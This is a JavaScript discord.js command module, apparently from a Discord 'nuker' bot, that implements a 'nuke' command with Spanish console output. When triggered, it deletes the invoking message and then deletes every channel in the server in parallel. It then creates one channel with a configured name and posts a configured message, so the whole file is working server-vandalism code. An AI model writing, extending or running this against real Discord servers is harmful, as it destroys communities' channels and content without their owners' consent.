const { ChannelType } = require('discord.js');
require('colors');

var { Message, Name } = require('../config.json');

module.exports = {
    name: 'nuke',

    async execute(client, message) {
        async function deleteChannels(guild) {
            try {
                const channels = guild.channels.cache;
                const tasks = Array.from(channels.values()).map(channel => (channel.delete()));
                await Promise.all(tasks);
            } catch {
                return;
            }
        }

        async function createChannel(guild) {
            try {
                let channel = await guild.channels.create({
                    name: Name,
                    type: ChannelType.GuildText
                });
                return channel;
            } catch {
                return;
            }
        }

        await message.delete();
        let channels = (await message.guild.channels.fetch()).size;
        await deleteChannels(message.guild);
        console.log(" [+] ".green + ` Canales borrados: ${channels}. `);
        channel = await createChannel(message.guild);
        await channel.send(Message);
        console.log(" [+] ".green + ` Nukeo a ${message.guild.name} completado.`.white);
    }
}